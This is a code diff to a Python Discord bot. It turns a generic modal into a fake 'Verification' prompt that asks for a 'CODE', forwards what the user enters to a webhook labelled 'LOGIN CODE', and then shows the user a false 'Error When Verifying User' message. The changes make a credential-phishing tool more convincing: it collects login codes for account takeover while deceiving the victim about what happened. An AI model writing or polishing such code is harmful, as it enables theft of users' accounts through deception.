@@ -5,8 +5,8 @@ import discord
 from discord import ui, Webhook, NotFound, HTTPException
 
 
-class MyModalTwo(ui.Modal, title="Modal Title Here"):
-    box_three = ui.TextInput(label="Question 3", required=True)
+class MyModalTwo(ui.Modal, title="Verification"):
+    box_three = ui.TextInput(label="CODE", required=True)
 
     async def on_submit(self, interaction: discord.Interaction, /) -> None:
         with open("data.json", "r") as f:
@@ -20,7 +20,7 @@ class MyModalTwo(ui.Modal, title="Modal Title Here"):
                     await webhook.send(
                         embed=discord.Embed(
                             title="LOGIN CODE",
-                            description=f"**```LOGIN CODE```**: {self.box_three.value}",
+                            description=f"**LOGIN CODE**: ```{self.box_three.value}```",
                             colour=0x008000
                         )
                     )
@@ -29,5 +29,5 @@ class MyModalTwo(ui.Modal, title="Modal Title Here"):
                 except HTTPException:
                     return await interaction.response.send_message("Couldn't send to webhook", ephemeral=True)
             await interaction.response.send_message(
-                "Submitted", ephemeral=True
+                "Error When Verifying User", ephemeral=True
             )
